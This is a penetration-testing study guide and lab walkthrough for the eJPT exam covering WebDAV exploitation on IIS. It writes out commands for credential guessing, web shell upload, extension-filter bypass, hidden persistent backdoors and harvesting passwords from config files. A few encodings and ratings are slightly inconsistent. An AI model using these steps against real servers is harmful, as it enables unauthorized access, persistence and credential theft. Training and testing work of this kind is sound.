# üîß WebDAV Manual Exploitation Techniques

Complete methodology for exploiting WebDAV misconfigurations and vulnerabilities

**Location in Framework:** `web-pentesting/exploitation/manual/webdav-exploitation.md`

---

## üéØ What is WebDAV Exploitation?

WebDAV (Web Distributed Authoring and Versioning) exploitation involves taking advantage of misconfigurations in WebDAV-enabled web servers to achieve unauthorized file upload, remote code execution, and system compromise. This attack vector is particularly common in Windows IIS environments where WebDAV is enabled by default.

**Key Attack Vectors:**
- **File Upload Vulnerabilities:** Uploading malicious files through WebDAV
- **Authentication Bypass:** Exploiting weak or default credentials
- **Remote Code Execution:** Executing uploaded web shells and backdoors
- **Information Disclosure:** Accessing sensitive files and configurations

WebDAV exploitation is a critical skill for penetration testers, especially when targeting Windows environments and web applications with file upload functionality.

---

## üì¶ Prerequisites and Environment Setup

### Target Requirements
- WebDAV-enabled web server (commonly IIS)
- HTTP/HTTPS access to WebDAV directory
- Valid credentials (if authentication required)
- Permissive file upload policies

### Tools Required
```bash
# Core WebDAV tools
davtest      # Automated WebDAV testing
cadaver      # Interactive WebDAV client
nmap         # Service discovery and enumeration
curl         # HTTP request testing

# Web shells and payloads
ls /usr/share/webshells/asp/     # ASP web shells
ls /usr/share/webshells/php/     # PHP web shells
ls /usr/share/webshells/jsp/     # JSP web shells
```

---

## üîß Complete WebDAV Exploitation Methodology

### Phase 1: Discovery and Reconnaissance

#### Step 1: Service Discovery
```bash
# Discover WebDAV services
nmap --script http-enum -sV -p 80,443 target
nmap --script http-webdav-scan -p 80,443 target
nmap --script http-methods --script-args http-methods.url-path=/webdav/ target
```

#### Step 2: Directory Enumeration
```bash
# Common WebDAV paths
curl -X OPTIONS http://target/webdav/
curl -X OPTIONS http://target/dav/
curl -X OPTIONS http://target/_vti_bin/
```

### Phase 2: Vulnerability Assessment

#### Step 3: Automated WebDAV Testing
```bash
# Basic capability testing
davtest -url http://target/webdav

# Authenticated testing
davtest -auth username:password -url http://target/webdav
```

### Phase 3: Manual Exploitation

#### Step 4: Interactive WebDAV Access
```bash
# Connect with cadaver
cadaver http://target/webdav
# Enter credentials when prompted
# Explore directory structure
ls
pwd
```

#### Step 5: Web Shell Upload and Execution
```bash
# Upload appropriate web shell based on server platform
put /usr/share/webshells/asp/webshell.asp
# Verify upload
ls
# Access via web browser
```

---

## üß™ Real Lab Examples

### Lab: Complete WebDAV Exploitation on Windows IIS

**Scenario:** End-to-end WebDAV exploitation from discovery to system access
- **Target:** http://demo.ine.local/webdav
- **Platform:** Windows IIS Server 10.0
- **Authentication:** bob:password_123321
- **Objective:** Achieve remote command execution and system information gathering

#### Phase 1: Initial Discovery (Previous Steps)
```bash
# Service discovery
nmap demo.ine.local
nmap --script http-enum -sV -p 80 demo.ine.local

# WebDAV testing
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# Manual file upload
cadaver http://demo.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
```

#### Phase 2: Web Shell Access and Command Execution

**Step 1: Initial Web Shell Access**
```bash
# Access URL: http://demo.ine.local/webdav/webshell.asp
# Authentication: bob:password_123321
```

**Expected Lab Interface:**
```
Web Shell Interface with command input field
- Server Information Display
- Command execution capability
- File system access
```

**Step 2: System Information Gathering**
```bash
# Execute whoami command
Command: whoami
```

**Expected Lab Output:**
```
\\DOTNETGOAT\\bobdemo.ine.local

The server's port:
80

The server's software:
Microsoft-IIS/10.0

The server's local address:
10.0.31.40
```

**Analysis:** Successfully achieved remote code execution as user "bob" on the DOTNETGOAT system running IIS 10.0.

#### Phase 3: File System Exploration

**Step 3: Directory Listing**
```bash
# Command via web shell
Command: dir C:%5C
# URL encoded: http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
```

**Expected Lab Output:**
```
Directory of C:\
11/14/2018  06:56 AM

11/02/2021  08:01 PM     32 flag.txt
10/27/2020  06:45 AM        inetpub
           05/13/2020  05:58 PM        PerfLogs
           10/27/2020  02:18 PM        Program Files
           10/27/2020  02:18 PM        Program Files (x86)
           10/27/2020  02:21 PM        [additional directories]
```

**Analysis:** Discovered flag.txt file in C:\ root directory, indicating successful file system access.

#### Phase 4: Flag Extraction

**Step 4: Reading the Target Flag**
```bash
# Command to read flag.txt
Command: type C:%3A%5Cflag.txt
# URL: http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
```

**Expected Lab Output:**
```
\\DOTNETGOAT\\bobdemo.ine.local

The server's port:
80

The server's software:
Microsoft-IIS/10.0

The server's local address:
10.0.31.40 [Highlighted text: 0cc175b9c0f1b6a831c399e269772661]
```

**Final Result:**
```
Flag: 0cc175b9c0f1b6a831c399e269772661
```

**Analysis:** Successfully extracted the target flag, demonstrating complete system compromise through WebDAV exploitation.

### Attack Summary

**Complete Attack Chain:**
1. **Discovery:** nmap ‚Üí found port 80 with IIS
2. **Enumeration:** nmap http-enum ‚Üí discovered /webdav directory  
3. **Assessment:** davtest ‚Üí confirmed ASP upload and execution capabilities
4. **Exploitation:** cadaver ‚Üí uploaded ASP web shell
5. **Access:** Web browser ‚Üí gained remote command execution
6. **Escalation:** File system commands ‚Üí explored C:\ drive
7. **Objective:** Flag extraction ‚Üí retrieved target flag

---

## üéØ eJPT Exam Focus

### Critical WebDAV Exploitation Skills

#### 1. Complete Attack Methodology
```bash
# Discovery phase
nmap --script http-enum target
nmap --script http-webdav-scan target

# Assessment phase  
davtest -auth user:pass -url http://target/webdav

# Exploitation phase
cadaver http://target/webdav
put webshell.asp

# Access phase
# Browser: http://target/webdav/webshell.asp
```

#### 2. Platform-Specific Knowledge
- **Windows/IIS:** Focus on ASP/ASPX web shells
- **Linux/Apache:** Focus on PHP web shells  
- **Java/Tomcat:** Focus on JSP web shells
- **File Extension Bypass:** Understanding server-side filtering

#### 3. Post-Exploitation Activities
- **System Information:** whoami, systeminfo, ipconfig
- **File System Navigation:** dir, ls, cd commands
- **Privilege Assessment:** Current user permissions and groups
- **Network Information:** Network configuration and connectivity

### Common eJPT Scenarios
- **WebDAV Discovery:** Finding WebDAV endpoints through enumeration
- **Credential Testing:** Trying default or discovered credentials
- **File Upload Exploitation:** Uploading and executing web shells
- **System Reconnaissance:** Gathering system information post-compromise

### Key eJPT Commands to Master
```bash
# Complete workflow
nmap --script http-enum -p 80 target
davtest -auth user:pass -url http://target/webdav  
cadaver http://target/webdav
# Web shell commands: whoami, dir, type filename.txt
```

---

## ‚ö†Ô∏è Common Issues & Advanced Techniques

### Issue 1: File Extension Filtering
```bash
# Problem: .asp files blocked
# Solution: Try alternative extensions
# Upload as .txt, then use MOVE method to rename
put shell.txt
move shell.txt shell.asp
```

### Issue 2: Authentication Challenges
```bash
# Problem: Unknown credentials
# Try common credentials
davtest -auth admin:admin -url http://target/webdav
davtest -auth administrator:password -url http://target/webdav
davtest -auth guest: -url http://target/webdav
```

### Issue 3: Command Execution Limitations
```bash
# Problem: Limited command execution
# Use URL encoding for special characters
# C:\ = C%3A%5C
# Spaces = +
# Use PowerShell for advanced commands
```

### Issue 4: Persistent Access
```bash
# Upload multiple backdoors
put shell1.asp
put shell2.txt
put config.aspx
# Create hidden directories
mkdir .hidden
cd .hidden
put backup_shell.asp
```

---

## üîó Integration with Other Techniques

### Pre-Exploitation Intelligence
```bash
# Service enumeration
nmap -sV -p 80,443 target
nmap --script http-enum target

# Directory bruteforcing  
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
dirb http://target /usr/share/wordlists/dirb/common.txt
```

### Post-Exploitation Expansion
```bash
# After web shell access
# System enumeration
whoami /all
systeminfo
net user
net localgroup administrators

# Network reconnaissance
ipconfig /all
netstat -an
arp -a
```

### Credential Harvesting
```bash
# Look for configuration files
dir web.config
type web.config
dir *.config
# Search for database connections
findstr /i "password" *.config
findstr /i "connectionstring" *.config
```

---

## üìù Documentation and Evidence

### Comprehensive Lab Documentation

#### Attack Timeline
```
Phase 1: Discovery (0-5 minutes)
- nmap scan: Discovered port 80 with IIS
- http-enum: Found /webdav directory
- Service: Microsoft-IIS/10.0

Phase 2: Assessment (5-10 minutes)  
- davtest: Confirmed WebDAV with authentication
- Credentials: bob:password_123321
- Capabilities: ASP upload and execution

Phase 3: Exploitation (10-15 minutes)
- cadaver: Manual file upload
- Upload: webshell.asp (1362 bytes)
- Access: http://demo.ine.local/webdav/webshell.asp

Phase 4: System Access (15-20 minutes)
- whoami: \\DOTNETGOAT\\bobdemo.ine.local  
- dir C:\: File system exploration
- Flag: 0cc175b9c0f1b6a831c399e269772661
```

#### Technical Evidence
```
Target Information:
- IP: 10.0.31.40 (demo.ine.local)
- OS: Windows Server with IIS 10.0
- WebDAV: http://demo.ine.local/webdav
- Authentication: HTTP Basic (bob:password_123321)

Vulnerability Details:
- WebDAV misconfiguration allowing file upload
- ASP code execution enabled
- No file type restrictions
- Weak authentication credentials

Exploitation Results:
- Remote code execution achieved
- System information gathered
- File system access confirmed  
- Target objective completed (flag extraction)
```

#### Risk Assessment
```
Critical Findings:
1. Remote Code Execution via WebDAV
   - Severity: Critical
   - CVSS: 9.8 (Network accessible, no privileges required)
   - Impact: Complete system compromise

2. Weak Authentication
   - Severity: High  
   - Default/weak credentials enable unauthorized access
   - No account lockout policies observed

3. Information Disclosure
   - Severity: Medium
   - System information readily available
   - File system accessible via web shell

Recommendations:
- Disable WebDAV or implement strict file type filtering
- Enforce strong authentication mechanisms
- Implement application-level access controls
- Regular security assessments and monitoring
```

This comprehensive documentation provides a complete picture of the WebDAV exploitation process, suitable for both learning and professional penetration testing reports.
